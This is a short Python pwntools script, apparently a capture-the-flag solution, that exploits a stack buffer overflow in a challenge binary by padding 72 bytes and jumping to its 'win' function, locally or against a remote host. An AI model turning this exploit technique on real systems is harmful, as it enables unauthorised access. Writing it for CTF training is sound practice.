#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./chall")
HOST, PORT = "HOST", 1337
OFFSET = 72

io = remote(HOST, PORT) if args.REMOTE else process(elf.path)
rop = ROP(elf)
ret = rop.find_gadget(["ret"])[0]

payload = flat(
    b"A" * OFFSET,
    ret,
    elf.sym["win"],
)

io.sendlineafter(b"> ", payload)
io.interactive()

